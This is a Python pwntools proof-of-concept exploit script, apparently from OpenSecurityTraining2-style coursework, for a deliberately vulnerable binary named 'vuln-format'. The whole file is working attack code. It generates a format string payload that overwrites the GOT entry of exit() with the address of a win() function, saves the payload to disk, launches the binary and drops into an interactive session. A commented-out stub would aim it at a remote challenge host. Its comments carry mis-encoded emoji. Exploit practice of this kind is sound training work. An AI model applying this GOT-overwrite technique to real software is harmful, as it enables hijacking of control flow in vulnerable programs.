#!/usr/bin/env python3
# Format String Exploit PoC for vuln-format (OST2 Style)

from pwn import *

context.binary = elf = ELF('./vuln-format', checksec=False)
context.log_level = 'info'  # Change to 'debug' to see all pwntools logs

# -----------------------------------------------------
# ðŸŽ¯ CONFIGURATION
# -----------------------------------------------------

BINARY_PATH = './vuln-format'
FUNC_TO_HIJACK = 'exit'
OFFSET = 6  # Adjust based on %p fuzzing or gdb

# -----------------------------------------------------
# ðŸŽ¯ PREPARE TARGET ADDRESSES
# -----------------------------------------------------

got_entry = elf.got[FUNC_TO_HIJACK]
win_addr = elf.symbols['win']

log.info(f"Target function: {FUNC_TO_HIJACK}")
log.info(f"ðŸ“Œ GOT entry @ {hex(got_entry)}")
log.info(f"ðŸ“Œ win()     @ {hex(win_addr)}")

# -----------------------------------------------------
# ðŸ§ª GENERATE FORMAT STRING PAYLOAD
# -----------------------------------------------------

payload = fmtstr_payload(offset=OFFSET, writes={got_entry: win_addr}, write_size='short')
log.success(f"Generated payload ({len(payload)} bytes)")

# Optional: save payload for debugging
with open("payload.txt", "wb") as f:
    f.write(payload)
    log.info("Payload saved to payload.txt")

# -----------------------------------------------------
# ðŸš€ RUN THE TARGET
# -----------------------------------------------------

def run_local():
    io = process([BINARY_PATH, payload])
    return io

# Optional remote mode (for CTFs or challenge servers)
# def run_remote():
#     return remote("target.host", 1337)

# -----------------------------------------------------
# ðŸ•¹ INTERACT WITH THE PROGRAM
# -----------------------------------------------------

io = run_local()
log.info("Launching target...")

# Trigger exit() to jump to win()
io.sendlineafter(b"> ", b"")  # Only needed if program has stdin input
io.interactive()
